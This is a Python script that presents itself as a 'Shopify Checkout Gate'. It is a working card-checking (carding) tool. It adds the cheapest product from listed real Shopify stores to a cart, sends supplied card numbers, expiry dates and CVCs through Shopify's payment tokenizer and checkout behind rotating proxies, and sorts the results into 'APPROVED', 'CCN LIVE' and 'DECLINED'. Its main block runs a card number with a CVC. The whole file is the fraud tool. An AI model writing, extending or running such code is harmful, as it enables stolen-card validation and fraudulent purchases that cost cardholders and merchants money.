"""
Shopify Checkout Gate - Uses legacy checkout form submission
Scrapes Shopify stores, finds cheapest products, completes payment flow
"""

import requests
import random
import re
import time
import json
import urllib3
from typing import Tuple, Optional
from urllib.parse import urlparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

SHOPIFY_STORES = [
    "kyliecosmetics.com",
    "fashionnova.com",
    "allbirds.com",
    "colourpop.com",
    "gymshark.com",
    "skims.com",
    "brooklinen.com",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

def normalize_proxy(proxy) -> Optional[dict]:
    """Normalize proxy to dict format"""
    if not proxy:
        return None
    if isinstance(proxy, dict):
        return proxy
    if isinstance(proxy, str):
        parts = proxy.split(':')
        if len(parts) == 4:
            proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif len(parts) == 2:
            proxy_url = f"http://{parts[0]}:{parts[1]}"
        else:
            proxy_url = proxy if proxy.startswith('http') else f"http://{proxy}"
        return {'http': proxy_url, 'https': proxy_url}
    return None


def find_cheapest_product(session: requests.Session, base_url: str) -> Tuple[Optional[int], float]:
    """Find the cheapest available product on a Shopify store"""
    cheapest_id = None
    cheapest_price = float('inf')
    
    try:
        resp = session.get(f"{base_url}/products.json?limit=100", timeout=10)
        if resp.status_code != 200:
            return None, 0.0
        
        products = resp.json().get('products', [])
        
        for product in products[:50]:
            variants = product.get('variants', [])
            for variant in variants:
                if not variant.get('id'):
                    continue
                
                try:
                    price = float(variant.get('price', 99999))
                except (ValueError, TypeError):
                    continue
                
                is_available = variant.get('available', True)
                
                if is_available and 0.50 <= price <= 50.0 and price < cheapest_price:
                    cheapest_price = price
                    cheapest_id = variant.get('id')
        
        if cheapest_id:
            return cheapest_id, cheapest_price
            
        for product in products[:10]:
            variants = product.get('variants', [])
            for variant in variants:
                if variant.get('id') and variant.get('available', True):
                    try:
                        price = float(variant.get('price', 0))
                        return variant['id'], price
                    except:
                        return variant['id'], 0.0
        
    except Exception:
        pass
    
    return None, 0.0


def extract_checkout_token(html: str) -> Optional[str]:
    """Extract checkout token from page"""
    patterns = [
        r'name="authenticity_token" value="([^"]+)"',
        r'"authenticity_token"\s*:\s*"([^"]+)"',
        r'csrf-token"\s*content="([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            return match.group(1)
    return None


def extract_checkout_session_token(html: str) -> Optional[str]:
    """Extract session token from checkout page"""
    patterns = [
        r'serialized-session-token"\s*content="&quot;([^"&]+)',
        r'serialized-session-token"\s*content="([^"]+)"',
        r'"sessionToken"\s*:\s*"([^"]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            return match.group(1)
    return None


def extract_payment_session_id(html: str) -> Optional[str]:
    """Extract payment session ID"""
    patterns = [
        r'paymentSessionId["\']?\s*[:=]\s*["\']([^"\']+)',
        r'"id"\s*:\s*"(west-[a-f0-9]+|east-[a-f0-9]+)"',
    ]
    for pattern in patterns:
        match = re.search(pattern, html)
        if match:
            return match.group(1)
    return None


def tokenize_card(session: requests.Session, domain: str, card_num: str, 
                  card_mon: str, card_yer: str, card_cvc: str) -> Tuple[Optional[str], str]:
    """
    Tokenize card via Shopify PCI endpoint
    Returns: (session_id, status_message)
    """
    year = int(card_yer) if len(card_yer) == 4 else int(f"20{card_yer}")
    
    pci_headers = {
        'accept': 'application/json',
        'content-type': 'application/json',
        'origin': 'https://checkout.pci.shopifyinc.com',
        'user-agent': random.choice(USER_AGENTS),
    }
    
    card_data = {
        'credit_card': {
            'number': card_num,
            'month': int(card_mon),
            'year': year,
            'verification_value': card_cvc,
            'name': 'John Doe',
        },
        'payment_session_scope': domain,
    }
    
    try:
        resp = session.post(
            'https://checkout.pci.shopifyinc.com/sessions',
            headers=pci_headers,
            json=card_data,
            timeout=15
        )
        
        if resp.status_code == 200:
            result = resp.json()
            session_id = result.get('id')
            if session_id:
                return session_id, "OK"
            else:
                error = result.get('error', {}).get('message', 'No session ID')
                return None, error
        
        try:
            error = resp.json().get('error', {}).get('message', f'HTTP {resp.status_code}')
        except:
            error = f'HTTP {resp.status_code}'
        
        return None, error
        
    except requests.exceptions.Timeout:
        return None, "Timeout"
    except Exception as e:
        return None, str(e)[:50]


def submit_checkout(session: requests.Session, checkout_url: str, payment_session_id: str,
                    card_num: str, card_mon: str, card_yer: str, card_cvc: str) -> str:
    """
    Submit checkout form with payment
    Returns status message
    """
    try:
        resp = session.get(checkout_url, timeout=15)
        html = resp.text
        
        token = extract_checkout_token(html)
        session_token = extract_checkout_session_token(html)
        
        amount_match = re.search(r'total.*?(\d+[.,]\d{2})', html, re.IGNORECASE | re.DOTALL)
        amount = float(amount_match.group(1).replace(',', '.')) if amount_match else 0.0
        
        year = card_yer if len(card_yer) == 4 else f"20{card_yer}"
        
        payload = {
            "_method": "patch",
            "previous_step": "shipping_method",
            "step": "payment_method",
            "authenticity_token": token or "",
            "checkout[payment_gateway]": "",
            "checkout[credit_card][number]": card_num,
            "checkout[credit_card][month]": card_mon,
            "checkout[credit_card][year]": year,
            "checkout[credit_card][verification_value]": card_cvc,
            "checkout[credit_card][name]": "John Doe",
        }
        
        if payment_session_id:
            payload["checkout[payment_session_id]"] = payment_session_id
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Referer": checkout_url,
            "Content-Type": "application/x-www-form-urlencoded",
        }
        
        resp = session.post(
            checkout_url,
            data=payload,
            headers=headers,
            timeout=20,
            allow_redirects=True
        )
        
        response_text = resp.text.lower()
        
        if any(kw in response_text for kw in ["order confirmed", "thank you", "order complete", "success"]):
            return f"APPROVED ${amount:.2f}"
        
        decline_patterns = {
            "CVV Mismatch": ["invalid.*cvc", "cvc.*invalid", "incorrect.*security", "cvv.*mismatch"],
            "Expired Card": ["card.*expired", "expired.*card"],
            "Insufficient Funds": ["insufficient.*funds", "balance.*insufficient"],
            "Invalid Card": ["invalid.*card", "card.*invalid"],
            "Card Declined": ["declined", "card.*declined"],
            "Fraud": ["fraud", "suspicious"],
        }
        
        for reason, patterns in decline_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response_text):
                    if reason in ["CVV Mismatch", "Insufficient Funds"]:
                        return f"CCN LIVE - {reason}"
                    return f"DECLINED - {reason}"
        
        if "3d" in response_text or "3ds" in response_text or "authentication" in response_text:
            return "CCN LIVE - 3DS Required"
        
        if "error" in response_text or "fail" in response_text:
            return "DECLINED - Unknown"
        
        return "DECLINED - No response"
        
    except requests.exceptions.Timeout:
        return "Error: Timeout"
    except Exception as e:
        return f"Error: {str(e)[:40]}"


def shopify_checkout_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                           shopify_url: str = None, proxy = None) -> Tuple[str, bool]:
    """
    Full Shopify checkout flow:
    1. Find store with cheapest product
    2. Add to cart
    3. Get checkout URL
    4. Tokenize card
    5. Submit payment
    
    Returns: (status_message, proxy_alive)
    """
    proxy_alive = False
    start_time = time.time()
    
    session = requests.Session()
    session.verify = False
    
    proxy_dict = normalize_proxy(proxy)
    if proxy_dict:
        session.proxies.update(proxy_dict)
    
    stores = [shopify_url] if shopify_url else random.sample(SHOPIFY_STORES, min(3, len(SHOPIFY_STORES)))
    
    for store in stores:
        try:
            if not store.startswith('http'):
                store = f"https://{store}"
            
            parsed = urlparse(store)
            domain = parsed.netloc
            base_url = f"https://{domain}"
            
            variant_id, price = find_cheapest_product(session, base_url)
            if not variant_id:
                continue
            
            proxy_alive = True
            
            add_resp = session.post(
                f"{base_url}/cart/add.js",
                json={"id": variant_id, "quantity": 1},
                timeout=10
            )
            
            if add_resp.status_code not in [200, 201]:
                session.post(
                    f"{base_url}/cart/add.js",
                    data={"id": variant_id, "quantity": 1},
                    timeout=10
                )
            
            cart_resp = session.get(f"{base_url}/cart.json", timeout=10)
            cart_data = cart_resp.json()
            checkout_url = cart_data.get('checkout_url')
            
            if not checkout_url and cart_data.get('token'):
                checkout_url = f"{base_url}/checkout?cart={cart_data['token']}"
            
            if not checkout_url:
                checkout_url = f"{base_url}/checkout"
            
            payment_session_id, token_status = tokenize_card(
                session, domain, card_num, card_mon, card_yer, card_cvc
            )
            
            if not payment_session_id:
                if "live" in token_status.lower() or "test" in token_status.lower():
                    return (f"DECLINED - {token_status} [{domain}]", proxy_alive)
                return (f"Error: Tokenization failed - {token_status}", proxy_alive)
            
            result = submit_checkout(
                session, checkout_url, payment_session_id,
                card_num, card_mon, card_yer, card_cvc
            )
            
            elapsed = round(time.time() - start_time, 2)
            
            if "APPROVED" in result or "CCN LIVE" in result:
                return (f"{result} [{domain}] [{elapsed}s]", proxy_alive)
            else:
                return (f"{result} [{domain}]", proxy_alive)
                
        except requests.exceptions.Timeout:
            continue
        except requests.exceptions.RequestException:
            continue
        except Exception:
            continue
    
    return ("Error: All stores failed", proxy_alive)


if __name__ == "__main__":
    result, alive = shopify_checkout_check("4223240003853798", "12", "27", "621")
    print(f"Result: {result}")
    print(f"Proxy OK: {alive}")
